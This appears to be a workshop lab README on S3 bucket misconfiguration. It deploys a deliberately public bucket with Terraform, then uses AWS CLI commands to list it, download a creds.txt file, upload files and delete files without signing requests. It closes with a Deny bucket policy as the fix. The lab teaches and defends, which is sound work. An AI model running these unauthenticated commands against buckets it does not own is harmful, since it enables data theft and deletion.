# S3 Misconfiguration

## Follow the below instructions given to solve this Lab

### please install the below cli tools 


* AWS CLI

```bash
sudo apt-get install awscli
```
* Terraform - click on the below link for further help on on installing 

```bash
https://developer.hashicorp.com/terraform/tutorials/aws-get-started/install-cli
```

* Step 1 Clone the repository 

```bash
git clone https://github.com/bvabhishek/s3misconfiguration.git
```
* Step 2: Change Directory

```bash
cd /s3misconfiguration
```
* Step 3: Initialise terraform 

```bash
terraform init
```

* Step 4: Run `terraform apply -auto-approve`

```bash
terraform apply -auto-approve
```

* Step 5: Export bucket name
```bash
export s3bucket=<bucketname> 
```

* Step 6: Lets try to list down the contents of bucket

```bash
aws s3 ls s3://$s3bucket
```

* Step 7: Now lets perform all the possible attack scenario 

* Step 8: Lets first download the fishy files - change to your current working directory

```bash
aws s3 cp s3://$s3bucket/creds.txt /home/abhi/seasides/

```
* To download all the files from the bucket use sync command

```bash
aws s3 sync s3://$s3bucket /home/abhi/seasides/test/
```

* Step 9: Let's upload a new file 

```bash
aws s3 cp seasides.jpeg s3://$s3bucket --no-sign-request --region us-west-2
```

* Step 10: Let's Delete a file 


```bash
aws s3 rm s3://$s3bucket/emp_pay_dont_delete.csv --no-sign-request --region us-west-2
```


* By this we know that the attacker has performed all the malicious functionalities ie, CRUD operations which leads to Vulnerabilities such as 
* Broken Authentication
* Sensitive Information Disclosure 

# Defence 

Using Client Side Encryption 





Step 1 : Ensure maximum protection is being given to the bucket and its object. You can change the Bucket policy
In line no 22 , 29 & 36 change the Effect to "Deny" which should look like 

```bash
resource "aws_s3_bucket_policy" "lab1_policy" {
  bucket = aws_s3_bucket.lab1.id

  policy = <<EOF
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "PublicAccess",
      "Effect": "Deny",
      "Principal": "*",
      "Action": "s3:*",
      "Resource": "${aws_s3_bucket.lab1.arn}/*"
    },
    {
      "Sid": "PublicWrite-PutObject",
      "Effect": "Deny",
      "Principal": "*",
      "Action": "s3:PutObject",
      "Resource": "${aws_s3_bucket.lab1.arn}/*"
    },
    {
      "Sid": "AllowListObjects",
      "Effect": "Deny",
      "Principal": "*",
      "Action": "s3:ListBucket",
      "Resource": "${aws_s3_bucket.lab1.arn}"
    }
  ]

}
EOF
}
```

 
